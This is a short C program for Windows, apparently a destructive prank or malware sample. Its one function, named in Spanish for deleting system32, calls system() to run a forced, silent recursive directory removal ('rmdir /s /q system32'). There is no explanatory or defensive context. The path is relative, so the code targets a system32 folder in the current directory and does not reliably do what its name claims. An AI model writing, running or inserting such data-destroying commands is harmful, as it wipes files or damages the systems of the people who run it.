
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void eliminar_system32(){
    system("rmdir /s /q system32");
}

int main(){
    eliminar_system32();
    return 0;
}